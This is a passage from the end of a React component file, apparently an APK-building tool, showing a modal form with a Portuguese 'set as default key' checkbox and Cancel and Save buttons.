            <input type="checkbox" checked={form.isDefault} onChange={(e) => setForm({ ...form, isDefault: e.target.checked })} className="w-4 h-4" />
            <span className="text-white">Definir como chave padrão</span>
          </label>
        </div>
        
        <div className="flex gap-3 mt-6">
          <button onClick={onClose} className="flex-1 py-2 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold">
            Cancelar
          </button>
          <button onClick={() => onSave(form)} className="flex-1 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold">
            Salvar
          </button>
        </div>
      </div>
    </div>
  );
};

export default APKStudio;

